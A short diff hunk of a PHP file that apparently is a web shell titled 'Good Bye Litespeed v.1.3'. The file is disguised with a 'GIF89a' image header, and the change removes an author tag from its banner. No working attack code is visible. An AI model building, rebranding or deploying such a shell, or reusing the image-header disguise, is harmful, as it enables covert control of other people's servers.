@@ -132,7 +132,7 @@ GIF89a;<!DOCTYPE html>
     }
 
     echo '<div class="text-center mb-8">
-            <h1 class="text-4xl font-bold">Good Bye Litespeed [./Heartzz]</h1>
+            <h1 class="text-4xl font-bold">Good Bye Litespeed</h1>
             <p class="text-lg italic">v.1.3</p>
         </div>';
     echo "<p>Zona waktu server: " . $timezone . "</p>";
